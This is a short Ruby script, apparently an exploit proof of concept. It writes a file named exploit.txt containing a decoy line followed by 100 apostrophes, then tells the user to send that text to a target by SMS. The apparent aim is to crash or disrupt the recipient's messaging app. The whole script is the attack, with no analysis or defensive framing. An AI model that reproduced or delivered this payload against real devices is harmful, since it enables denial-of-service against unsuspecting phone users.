#!/usr/bin/env ruby
#Author: Un0wn_X

begin
buff = "Don't Scroll Down :D \n\n"
buff += "'"*100

file = open("exploit.txt","w")
file.write(buff)
file.close()

puts "[+] Exploit created >> exploit.txt"
puts "[*] Now send the text contained inside the exploit.txt by a sms"
puts "[~] Un0wn_X"
end
